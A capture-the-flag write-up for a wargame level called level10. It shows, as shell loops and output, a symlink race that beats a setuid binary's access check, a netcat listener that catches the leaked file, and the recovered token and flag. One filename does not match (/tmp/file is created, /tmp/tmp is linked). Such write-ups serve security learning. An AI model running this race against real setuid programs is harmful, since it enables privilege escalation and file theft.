# level10

- level10 is a client that read the file and send it if we have acces to it

- The binary is executed as the owner of the file but check who really run it to know if we have acces to the file
    > $ ./level10 ./token 0
    > You don't have access to ./token

- We can exploit the time between the check of the right and the opening of the
    file by creating a symlink to a file we have the right to read and switching
    rapidly beetween the file and the token
    ```sh
    $ touch /tmp/file
    $ while true; do
        ln -fs /home/user/level10/token /tmp/token
        ln -fs /tmp/tmp /tmp/token
      done
    ```

- Then we create our server and listen infinitly to the level10 port (6969)
    ```sh
    $ nc -k -l 0 6969
    ```

- The we start the `./level10` infinitly
    ```sh
    $ while true; do
        ./level10 /tmp/token 0
      done
    ```
    > [...]
    > .*( )*.
    > woupa2yuojeeaaed06riuj63c
    > .*( )*.
    > [...]

- `$ su flag10` && `$ getflag`
    > Check flag.Here is your token : feulo4b72j7edeahuete3no7c

